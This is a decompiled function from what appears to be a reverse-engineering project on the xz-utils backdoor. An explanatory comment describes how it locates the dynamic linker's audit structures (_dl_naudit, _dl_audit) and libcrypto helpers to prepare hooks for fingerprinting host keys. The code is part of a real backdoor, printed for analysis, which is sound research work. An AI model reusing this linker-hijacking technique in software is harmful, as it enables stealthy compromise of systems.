// /home/kali/xzre-ghidra/xzregh/104370_find_dl_naudit.c
// Function: find_dl_naudit @ 0x104370
// Calling convention: unknown
// Prototype: undefined find_dl_naudit(void)


/*
 * AutoDoc: Parses `rtld_global_ro` for the `GLRO(dl_naudit)` string, locates the matching LEA inside
 * `_dl_audit_symbind_alt`, and from there recovers the addresses of `_dl_naudit` and
 * `_dl_audit` within ld.so. It also resolves a few extra libcrypto helpers (EVP_MD_CTX_free,
 * DSA_get0_{pqg,pub_key}) so the later monitor hooks can fingerprint host keys. The discovered
 * pointers are stored inside `hooks->ldso_ctx`.
 */
#include "xzre_types.h"


undefined8 find_dl_naudit(long *param_1,long *param_2,long param_3,long param_4)

{
  int iVar1;
  long lVar2;
  long lVar3;
  long lVar4;
  long lVar5;
  ulong uVar6;
  int *piVar7;
  int *piVar8;
  long *plVar9;
  undefined8 uVar10;
  ulong uVar11;
  int *piVar12;
  byte bVar13;
  uchar *rtld_global_ro;
  char *naudit_string;
  Elf64_Sym *libcrypto_symbol;
  undefined4 local_8c;
  uint *naudit_slot;
  long local_80;
  long local_78;
  byte local_6f;
  byte local_65;
  uint local_64;
  int *local_50;
  byte local_30;
  
  bVar13 = 0;
  local_8c = 0;
  naudit_slot = (uint *)0x0;
  lVar2 = elf_symbol_get(param_1,0xa98,0);
  if (lVar2 != 0) {
    local_8c = 0x6a8;
    lVar3 = elf_find_string(param_1,&local_8c,0);
    if (lVar3 != 0) {
      lVar4 = elf_symbol_get(param_2,0x9d0,0);
      lVar5 = elf_get_code_segment(param_1,&naudit_slot);
      if ((lVar5 != 0) &&
         (uVar6 = find_string_reference(lVar5,(long)naudit_slot + lVar5,lVar3), uVar6 != 0)) {
        if (lVar4 != 0) {
          lVar3 = *(long *)(lVar4 + 8);
          lVar4 = *param_2;
          *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
          *(long *)(param_4 + 0x30) = lVar3 + lVar4;
        }
        plVar9 = &local_80;
        for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
          *(undefined4 *)plVar9 = 0;
          plVar9 = (long *)((long)plVar9 + (ulong)bVar13 * -8 + 4);
        }
        piVar7 = (int *)(*(long *)(lVar2 + 8) + *param_1);
        lVar2 = *(long *)(lVar2 + 0x10);
        lVar3 = get_lzma_allocator(1);
        *(long **)(lVar3 + 0x10) = param_2;
        lVar4 = lzma_alloc(0xd10,lVar3);
        *(long *)(param_4 + 0x90) = lVar4;
        if (lVar4 != 0) {
          *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
        }
        piVar12 = (int *)0x0;
        uVar11 = uVar6 - 0x80;
        while (uVar11 < uVar6) {
          iVar1 = find_instruction_with_mem_operand_ex(uVar11,uVar6,&local_80,0x10b,0);
          uVar11 = uVar11 + 1;
          if (iVar1 != 0) {
            if ((local_6f & 1) != 0) {
              piVar8 = local_50;
              if ((local_64 & 0xff00ff00) == 0x5000000) {
                piVar8 = (int *)((long)local_50 + local_78 + local_80);
              }
              if ((((local_65 & 0x48) != 0x48) && (piVar7 < piVar8)) &&
                 (piVar8 + 1 <= (int *)((long)piVar7 + lVar2))) {
                piVar12 = piVar8;
              }
            }
            uVar11 = local_80 + 1 + (ulong)local_30;
          }
        }
        if ((piVar12 == (int *)0x0) ||
           (iVar1 = find_instruction_with_mem_operand_ex
                              (*(long *)(param_3 + 0x100),
                               *(long *)(param_3 + 0x108) + *(long *)(param_3 + 0x100),0,0x10b,
                               piVar12), iVar1 == 0)) {
          uVar10 = *(undefined8 *)(param_4 + 0x90);
        }
        else {
          lVar2 = lzma_alloc(0x468,lVar3);
          *(long *)(param_4 + 0x38) = lVar2;
          if (lVar2 != 0) {
            *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
          }
          if ((*piVar12 == 0) && (*(long *)(piVar12 + -2) == 0)) {
            *(int **)(param_3 + 0x78) = piVar12;
            *(int **)(param_3 + 0x70) = piVar12 + -2;
            return 1;
          }
          lzma_free(*(undefined8 *)(param_4 + 0x90),lVar3);
          uVar10 = *(undefined8 *)(param_4 + 0x38);
        }
        lzma_free(uVar10,lVar3);
      }
    }
  }
  return 0;
}

